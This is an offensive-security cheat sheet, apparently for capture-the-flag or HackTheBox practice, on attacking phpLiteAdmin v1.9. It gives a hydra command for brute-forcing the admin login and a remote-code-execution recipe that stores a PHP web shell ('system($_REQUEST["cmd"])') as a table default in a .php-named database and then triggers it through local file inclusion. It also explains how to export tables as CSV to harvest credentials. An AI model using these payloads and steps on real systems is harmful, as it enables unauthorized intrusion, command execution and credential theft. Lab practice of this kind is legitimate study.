# phpLiteAdmin

phpLiteAdmin v1.9 – web UI for SQLite databases. Often found under `/db/` on HTTPS virtual hosts.

**Common path:** `https://TARGET/db/` or `https://TARGET.htb/db/`

---

## Discovery

* Directory bust HTTPS (e.g. `gobuster dir -k -u https://TARGET -w ...` or feroxbuster).
* Nikto may report: `/db/: This might be interesting`, cookie flags (PHPSESSID without secure/httponly).
* PHP error on page can leak path: e.g. `Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114`.

---

## Default / weak credentials

| Username | Password |
|----------|----------|
| `admin` | (often default or weak; try `admin`, `password123`, or brute force) |

**Brute force (HTTPS POST form):**

```bash
hydra -l admin -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt TARGET_IP https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 3
```

Reference: [Acunetix – phpLiteAdmin default password](https://www.acunetix.com/vulnerabilities/web/phpliteadmin-default-password/)

---

## RCE: Create PHP database + LFI

If you can create a SQLite database and if the server has an LFI that can include files from a path where the DB is stored (e.g. `/var/tmp/`):

1. Log in to phpLiteAdmin.
2. Create a new database named `shell.php` or `d.php` (extension must be `.php`).
3. Create a table with one TEXT column and set the default value to PHP code. Use double quotes in the payload because this web app uses single quotes in the insertion command:  
   `<?php system($_REQUEST["cmd"]); ?>`
4. Example: table name `d`, column `d` type TEXT default `<?php system($_REQUEST["cmd"]); ?>`  
   Resulting SQL:  
   `CREATE TABLE 'd' ('d' TEXT default '<?php system($_REQUEST["cmd"]); ?>')`
5. Include the DB file via LFI (adjust path to match server; e.g. DB path `/var/tmp/`):  
   `https://TARGET/manage.php?notes=/validNote/../var/tmp/d.php&cmd=id`

**Exploit walkthrough:** https://github.com/chacka0101/exploits/blob/master/24044.txt

---

## Export DB as CSV

You can export the SQLite database as CSV from the UI. Use the export view:

`https://TARGET/db/index.php?view=export`

Exported tables may contain credentials (e.g. users, sessions, config). Download or view the CSV and search for passwords, API keys, or other sensitive data. The export may also leak paths or PHP notices in the output (e.g. `Undefined index: single_table` in `index.php`), which can help with further exploitation.
